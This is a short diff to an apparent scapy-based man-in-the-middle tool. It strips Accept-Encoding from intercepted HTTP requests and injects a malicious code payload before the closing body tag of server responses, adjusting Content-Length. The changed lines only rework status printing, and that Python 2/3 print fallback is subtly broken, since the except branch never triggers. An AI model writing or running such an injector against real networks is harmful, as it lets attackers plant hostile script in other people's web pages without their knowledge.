@@ -4,6 +4,7 @@ import scapy.all as scapy
 import re
 import optparse
 import argparse
+import sys
 
 def get_args():
     try:
@@ -28,10 +29,18 @@ def work_packet(packet):
     if use_packet.haslayer(scapy.Raw):
         raw_load = use_packet[scapy.Raw].load
         if use_packet[scapy.TCP].dport == 80:
-            print("[+] REQUEST...")
+            try:
+                print("\r[+] Detected Request..."),
+                sys.stdout.flush()
+            except:
+                print("\r[+] Detected Request...", end="")
             raw_load = re.sub("Accept-Encoding:.*?\\r\\n", "", raw_load)
         elif use_packet[scapy.TCP].sport == 80:
-            print("[+] RESPONSE...")
+            try:
+                print("\r[+] Server Responding..."),
+                sys.stdout.flush()
+            except:
+                print("\r[+] Server Responding...", end="")
             insert = value.mal_code
             raw_load = raw_load.replace("</body>", insert + "</body>")
             content_len = re.search("(?:Content-Length:\s)(\d*)", raw_load)
